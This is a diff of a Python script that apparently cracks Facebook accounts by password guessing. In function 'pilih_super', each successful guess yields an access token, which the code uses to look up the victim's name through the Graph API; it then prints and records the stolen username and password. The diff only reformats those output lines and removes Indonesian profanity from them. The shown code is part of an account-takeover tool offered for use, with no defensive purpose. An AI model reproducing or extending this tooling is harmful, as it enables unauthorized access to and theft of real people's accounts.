@@ -1357,7 +1357,7 @@ def pilih_super():
 					if 'access_token' in q:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 						z = json.loads(x.text)
-						print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"Kontol" +pass2+" =>"+z['name'])
+						print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass2+" =>"+z['name'])
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
@@ -1373,7 +1373,7 @@ def pilih_super():
 							if 'access_token' in q:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 								z = json.loads(x.text)
-								print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"123" +pass3+" =>"+z['name'])
+								print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass3+" =>"+z['name'])
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
@@ -1390,7 +1390,7 @@ def pilih_super():
 									if 'access_token' in q:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 										z = json.loads(x.text)
-										print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"Bangsat" +pass4+" =>"+z['name'])
+										print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass4+" =>"+z['name'])
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
@@ -1406,7 +1406,7 @@ def pilih_super():
 											if 'access_token' in q:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 												z = json.loads(x.text)
-												print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"Sayang" +pass5+" =>"+z['name'])
+												print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass5+" =>"+z['name'])
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
@@ -1422,7 +1422,7 @@ def pilih_super():
 													if 'access_token' in q:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 														z = json.loads(x.text)
-														print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"Kontol" +pass6+" =>"+z['name'])
+														print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass6+" =>"+z['name'])
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -1440,7 +1440,7 @@ def pilih_super():
 															if 'access_token' in q:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 																z = json.loads(x.text)
-																print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+"1" +pass7+" =>"+z['name'])
+																print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" | " +pass7+" =>"+z['name'])
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
